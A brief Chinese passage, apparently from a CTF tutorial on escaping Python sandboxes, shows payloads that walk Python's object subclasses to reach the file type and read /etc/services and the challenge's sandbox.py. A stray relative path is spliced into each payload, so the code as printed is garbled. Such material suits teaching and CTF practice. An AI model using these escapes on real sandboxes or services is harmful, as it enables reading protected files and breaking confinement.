...
如，我们可通过
`print ().__class__.__bases__[0].__subclasses__()[40](../../../pwn/sandbox/python/"/etc/services").read()`达到文件读取的效果，
...
我们可以通过`print ().__class__.__bases__[0].__subclasses__()[40](../../../pwn/sandbox/python/"/home/ctf/sandbox.py").read()` 获取题目源码，然后可以进一步分析，以下提供三种逃逸方法。
